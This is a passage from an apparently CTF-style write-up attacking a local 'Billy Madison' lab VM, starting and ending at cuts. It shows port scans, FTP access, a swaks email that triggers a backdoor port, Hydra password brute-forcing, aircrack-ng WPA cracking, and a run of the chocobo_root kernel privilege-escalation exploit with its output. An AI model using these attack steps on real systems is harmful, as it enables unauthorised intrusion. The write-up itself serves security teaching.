Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.28 seconds

Starting Nmap 7.01 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-03-13 13:57 EDT
Warning: 10.0.2.4 giving up on port because retransmission cap hit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.2.4
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00031s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.
PORT     STATE    SERVICE
1469/tcp filtered aal-lm
MAC Address: 08:00:27:2B:54:39 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.28 seconds

Starting Nmap 7.01 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-03-13 13:57 EDT
Warning: 10.0.2.4 giving up on port because retransmission cap hit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.2.4
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00047s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.
PORT     STATE    SERVICE
1514/tcp filtered unknown
MAC Address: 08:00:27:2B:54:39 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.42 seconds

Starting Nmap 7.01 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-03-13 13:57 EDT
Warning: 10.0.2.4 giving up on port because retransmission cap hit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.2.4
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00074s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.
PORT     STATE    SERVICE
1981/tcp filtered p2pq
MAC Address: 08:00:27:2B:54:39 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.27 seconds

Starting Nmap 7.01 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-03-13 13:57 EDT
Warning: 10.0.2.4 giving up on port because retransmission cap hit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.2.4
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00060s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.
PORT     STATE    SERVICE
1986/tcp filtered licensedaemon
MAC Address: 08:00:27:2B:54:39 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.27 seconds

Starting Nmap 7.01 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-03-13 13:57 EDT
Warning: 10.0.2.4 giving up on port because retransmission cap hit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.2.4
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00039s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.
PORT     STATE    SERVICE
1588/tcp filtered unknown
MAC Address: 08:00:27:2B:54:39 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.27 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now let's connect to &lt;b&gt;ftp&lt;/b&gt;, will this work?&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;ftp 10.0.2.4
Connected to 10.0.2.4.
220 Welcome to ColoradoFTP - the open &lt;span class=&quot;nb&quot;&gt;source &lt;/span&gt;FTP server &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www.coldcore.com&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.0.2.4:root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: eric
331 User name okay, need password.
Password:
230 User logged &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt;, proceed.
Remote system &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;is UNIX.
&lt;span class=&quot;gp&quot;&gt;ftp&amp;gt; &lt;/span&gt;ls
200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful.
150 Opening A mode data connection &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; /.
-rwxrwxrwx 1 ftp 5367 Aug 20 12:49 39772
-rwxrwxrwx 1 ftp 1287 Aug 20 12:49 9129
-rwxrwxrwx 1 ftp 868 Sep 01 10:42 .notes
-rwxrwxrwx 1 ftp 6326 Aug 20 12:49 40049
-rwxrwxrwx 1 ftp 9132 Aug 20 12:49 40054
-rwxrwxrwx 1 ftp 5208 Aug 20 12:49 39773
226 Transfer completed.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Great, we have access! I logged using previously known eric password credentials. We have some interesting files, but in the beginning, let's view &lt;b&gt;.notes&lt;/b&gt;. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~/Documents# &lt;/span&gt;cat .notes
Ugh, this is frustrating.  

I managed to make a system account &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;myself. I also managed to hide Billy&lt;span class=&quot;s1&quot;&gt;'s paper
where he'&lt;/span&gt;ll never find it.  However, now I can&lt;span class=&quot;s1&quot;&gt;'t find it either :-(.
To make matters worse, my privesc exploits aren'&lt;/span&gt;t working.  
One sort of worked, but I think I have it installed all backwards.

If I&lt;span class=&quot;s1&quot;&gt;'m going to maintain total control of Billy'&lt;/span&gt;s miserable life &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;or what&lt;span class=&quot;s1&quot;&gt;'s left of it)
I need to root the box and find that paper!

Fortunately, my SSH backdoor into the system IS working.  
All I need to do is send an email that includes
the text: &quot;My kid will be a ________ _________&quot;

Hint: https://www.youtube.com/watch?v=6u7RsW5SAgs

The new secret port will be open and then I can login from there with my wifi password, which I'&lt;/span&gt;m
sure Billy or Veronica know.  I didn&lt;span class=&quot;s1&quot;&gt;'t see it in Billy'&lt;/span&gt;s FTP folders, but didn&lt;span class=&quot;s1&quot;&gt;'t have time to
check Veronica'&lt;/span&gt;s.

-EG&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2&gt;Backdoor&lt;/h2&gt;

&lt;p&gt;Another cryptic riddle? This time it was a lot easier, since we can hear phrase &lt;b&gt;My kid will be a soccer player&lt;/b&gt; in the video. We can now send an email using &lt;b&gt;swaks&lt;/b&gt;. But to which port? &lt;/p&gt;

&lt;p&gt;By looking once again at .cap file we can see this line: &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;Transmission Control Protocol, Src Port: 42278 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;42278&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Dst Port: 2525 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2525&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Seq: 12, Ack: 78, Len: 36&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Destination port &lt;b&gt;2525&lt;/b&gt;. Let's construct this email! &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;swaks --to eric@madisonhotels.com --from vvaughn@polyfector.edu --server 10.0.2.4:2525 --body &lt;span class=&quot;s2&quot;&gt;&quot;My kid will be a soccer player&quot;&lt;/span&gt; --header &lt;span class=&quot;s2&quot;&gt;&quot;Subject: My kid will be a soccer player&quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; Trying 10.0.2.4:2525...
&lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; Connected to 10.0.2.4.
&amp;lt;-  220 BM ESMTP SubEthaSMTP null
 -&amp;gt; EHLO kali
&amp;lt;-  250-BM
&amp;lt;-  250-8BITMIME
&amp;lt;-  250-AUTH LOGIN
&amp;lt;-  250 Ok
 -&amp;gt; MAIL FROM:&amp;lt;vvaughn@polyfector.edu&amp;gt;
&amp;lt;-  250 Ok
 -&amp;gt; RCPT TO:&amp;lt;eric@madisonhotels.com&amp;gt;
&amp;lt;-  250 Ok
 -&amp;gt; DATA
&amp;lt;-  354 End data with &amp;lt;CR&amp;gt;&amp;lt;LF&amp;gt;.&amp;lt;CR&amp;gt;&amp;lt;LF&amp;gt;
 -&amp;gt; Date: Mon, 13 Mar 2017 15:08:57 -0400
 -&amp;gt; To: eric@madisonhotels.com
 -&amp;gt; From: vvaughn@polyfector.edu
 -&amp;gt; Subject: My kid will be a soccer player
 -&amp;gt; X-Mailer: swaks v20130209.0 jetmore.org/john/code/swaks/
 -&amp;gt;
 -&amp;gt; My kid will be a soccer player
 -&amp;gt;
 -&amp;gt; .
&amp;lt;-  250 Ok
 -&amp;gt; QUIT
&amp;lt;-  221 Bye
&lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; Connection closed with remote host.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2&gt;SSH&lt;/h2&gt;

&lt;p&gt;Hmmm, something happened for certain. But what? I run another &lt;b&gt;Nmap&lt;/b&gt; scan, and see that there is new port open at &lt;b&gt;1974&lt;/b&gt; - running &lt;b&gt;ssh&lt;/b&gt; service. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;PORT     STATE  SERVICE
22/tcp   open   ssh
23/tcp   open   telnet
69/tcp   open   tftp
80/tcp   open   http
137/tcp  closed netbios-ns
138/tcp  closed netbios-dgm
139/tcp  open   netbios-ssn
445/tcp  open   microsoft-ds
1974/tcp open   drp
2525/tcp open   ms-v-worlds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Reading back through the hints, we can see that there should be account named &lt;b&gt;Veronica&lt;/b&gt; in ftp. We can crack the password using &lt;b&gt;Hydra&lt;/b&gt; and previously created wordlist.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;hydra -t 10 -l veronica -P veronica.txt 10.0.2.4 ftp
Hydra v8.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2014 by van Hauser/THC - Please &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;not use &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;military or secret service organizations, or &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;illegal purposes.

Hydra &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://www.thc.org/thc-hydra&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; starting at 2017-03-13 15:18:59
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;DATA] max 10 tasks per 1 server, overall 64 tasks, 773 login tries &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;l:1/p:773&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, ~1 try per task
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;DATA] attacking service ftp on port 21
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;21][ftp] host: 10.0.2.4   login: veronica   password: babygirl_veronica07@yahoo.com
1 of 1 target successfully completed, 1 valid password found
Hydra &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://www.thc.org/thc-hydra&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; finished at 2017-03-13 15:19:15&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Great, we have the password! Now let's log in to ftp, maybe we'll find something useful?&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~/Documents# &lt;/span&gt;cat email-from-billy.eml
        Sat, 20 Aug 2016 12:55:45 -0500 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CDT&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Date: Sat, 20 Aug 2016 12:55:40 -0500
To: vvaughn@polyfector.edu
From: billy@madisonhotels.com
Subject: &lt;span class=&quot;nb&quot;&gt;test &lt;/span&gt;Sat, 20 Aug 2016 12:55:40 -0500
X-Mailer: swaks v20130209.0 jetmore.org/john/code/swaks/
Eric&lt;span class=&quot;s1&quot;&gt;'s wifi

Hey VV,

It'&lt;/span&gt;s your boy Billy here.  Sorry to leave &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the middle of the night but I wanted to crack Eric&lt;span class=&quot;s1&quot;&gt;'s wireless and then mess with him.
I wasn'&lt;/span&gt;t completely successful yet, but at least I got a start.

I didn&lt;span class=&quot;s1&quot;&gt;'t walk away without doing my signature move, though.  I left a flaming bag of dog poo on his doorstep. :-)

Kisses,

Billy&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now we have to crack another password, this time using &lt;b&gt;aircrack-ng&lt;/b&gt; tool. I was running some problems, because aircrack could not recognize &lt;b&gt;.cap&lt;/b&gt; file but after a little bit of googling I've found that it was due to downloading files in &lt;b&gt;ASCII&lt;/b&gt; mode, not in &lt;b&gt;BINARY&lt;/b&gt;. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~/Documents# &lt;/span&gt;aircrack-ng eg-01.cap -w /usr/share/wordlists/rockyou.txt
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;00:27:47] 1699628 keys tested &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;765.84 k/s&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;


        KEY FOUND! &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; triscuit&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;


Master Key     : 9E 8B 4F E6 CC 5E E2 4C 46 84 D2 AF 59 4B 21 6D
    B5 3B 52 84 04 9D D8 D8 83 67 AF 43 DC 60 CE 92

Transient Key  : 7A FA 82 59 5A 9A 23 6E 8C FB 1D 4B 4D 47 BE 13
    D7 AC AC 4C 81 0F B5 A2 EE 2D 9F CC 8F 05 D2 82
    BF F4 4E AE 4E C9 ED EA 31 37 1E E7 29 10 13 92
    BB 87 8A AE 70 95 F8 62 20 B5 2B 53 8D 0C 5C DC

EAPOL HMAC     : 86 63 53 4B 77 52 82 0C 73 4A FA CA 19 79 05 33
root@kali:~/Documents#&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now it's working. We also have a password, with which we can log to the &lt;b&gt;ssh&lt;/b&gt; service. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;ssh -p 1974 eric@10.0.2.4
eric@10.0.2.4&lt;span class=&quot;s1&quot;&gt;'s password:
Welcome to Ubuntu 16.04.1 LTS (GNU/Linux 4.4.0-66-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

110 packages can be updated.
0 updates are security updates.


Last login: Sat Aug 20 22:28:28 2016 from 192.168.3.101
eric@BM:~$ ls -la
total 532
drwxr-xr-x 3 eric eric   4096 Aug 23  2016 .
drwxr-xr-x 6 root root   4096 Aug 20  2016 ..
-rw-r--r-- 1 eric eric    220 Aug 20  2016 .bash_logout
-rw-r--r-- 1 eric eric   3771 Aug 20  2016 .bashrc
drwx------ 2 eric eric   4096 Aug 20  2016 .cache
-rw-r--r-- 1 root root 451085 Aug  7  2016 eric-tongue-animated.gif
-rw-r--r-- 1 root root  60710 Aug  7  2016 eric-unimpressed.jpg
-rw-r--r-- 1 eric eric    655 Aug 20  2016 .profile
-rw-r--r-- 1 root root    115 Aug 20  2016 why-1974.txt
eric@BM:~$ cat why-1974.txt
Why 1974?  Because: http://www.metacafe.com/watch/an-VB9KuJtnh4bn/billy_madison_1995_billy_hangs_out_with_friends/&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2&gt;Privilage Escalation&lt;/h2&gt;

&lt;p&gt;Some pictures but nothing else... To elevate privilages I decided to give a try this &lt;a href=&quot;https://www.exploit-db.com/exploits/40871/&quot;&gt;&lt;b&gt;Choco Root&lt;/b&gt;&lt;/a&gt; exploit, created for &lt;b&gt;Linux Kernel 4.4.0&lt;/b&gt;. It's using &lt;b&gt;race condition&lt;/b&gt; privilage escalation, which I'm going to discuss in one of my future posts. Now let's run it! &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;eric@BM:~$ &lt;/span&gt;touch chocobo_root.c
&lt;span class=&quot;gp&quot;&gt;eric@BM:~$ &lt;/span&gt;nano chocobo_root.c
&lt;span class=&quot;gp&quot;&gt;eric@BM:~$ &lt;/span&gt;gcc chocobo_root.c -o chocobo_root -lpthread
&lt;span class=&quot;gp&quot;&gt;eric@BM:~$ &lt;/span&gt;./chocobo_root
linux AF_PACKET race condition exploit by rebel
kernel version: 4.4.0-36-generic &lt;span class=&quot;c&quot;&gt;#55&lt;/span&gt;
proc_dostring &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0xffffffff81087ea0
modprobe_path &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0xffffffff81e48f80
register_sysctl_table &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0xffffffff81286e50
set_memory_rw &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0xffffffff8106f360
exploit starting
making vsyscall page writable..

new exploit attempt starting, jumping to 0xffffffff8106f360, &lt;span class=&quot;nv&quot;&gt;arg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0xffffffffff600000
sockets allocated
removing barrier and spraying..
version switcher stopping, x &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; -1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;y &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 81561, last val &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
current packet version &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 2
pbd-&amp;gt;hdr.bh1.offset_to_first_pkt &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 48
race not won

retrying stage..
new exploit attempt starting, jumping to 0xffffffff8106f360, &lt;span class=&quot;nv&quot;&gt;arg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0xffffffffff600000
sockets allocated
removing barrier and spraying..
version switcher stopping, x &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; -1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;y &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 163931, last val &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
current packet version &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 2
pbd-&amp;gt;hdr.bh1.offset_to_first_pkt &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 48
race not won

retrying stage..
new exploit attempt starting, jumping to 0xffffffff8106f360, &lt;span class=&quot;nv&quot;&gt;arg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0xffffffffff600000
sockets allocated
removing barrier and spraying..
version switcher stopping, x &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; -1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;y &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 221473, last val &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
current packet version &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0
pbd-&amp;gt;hdr.bh1.offset_to_first_pkt &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 48
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; TPACKET_V1 &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; offset_to_first_pkt !&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0, race won &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
please &lt;span class=&quot;nb&quot;&gt;wait &lt;/span&gt;up to a few minutes &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;timer to be executed. &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;you ctrl-c now the kernel will hang. so dont &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;that.
closing socket and verifying.......
vsyscall page altered!


stage 1 completed
registering new sysctl..

new exploit attempt starting, jumping to 0xffffffff81286e50, &lt;span class=&quot;nv&quot;&gt;arg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0xffffffffff600850
sockets allocated
removing barrier and spraying..
version switcher stopping, x &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; -1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;y &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 66563, last val &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
current packet version &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 2
pbd-&amp;gt;hdr.bh1.offset_to_first_pkt &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0
race not won

retrying stage..
new exploit attempt starting, jumping to 0xffffffff81286e50, &lt;span class=&quot;nv&quot;&gt;arg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0xffffffffff600850
sockets allocated
removing barrier and spraying..
version switcher stopping, x &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; -1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;y &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 143274, last val &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
current packet version &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 2
pbd-&amp;gt;hdr.bh1.offset_to_first_pkt &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 48
race not won

retrying stage..
new exploit attempt starting, jumping to 0xffffffff81286e50, &lt;span class=&quot;nv&quot;&gt;arg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0xffffffffff600850
sockets allocated
removing barrier and spraying..
version switcher stopping, x &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; -1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;y &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 158827, last val &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
current packet version &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0
pbd-&amp;gt;hdr.bh1.offset_to_first_pkt &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0
race not won

retrying stage..
new exploit attempt starting, jumping to 0xffffffff81286e50, &lt;span class=&quot;nv&quot;&gt;arg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0xffffffffff600850
sockets allocated
removing barrier and spraying..
version switcher stopping, x &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; -1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;y &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 99401, last val &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
current packet version &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0
pbd-&amp;gt;hdr.bh1.offset_to_first_pkt &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 48
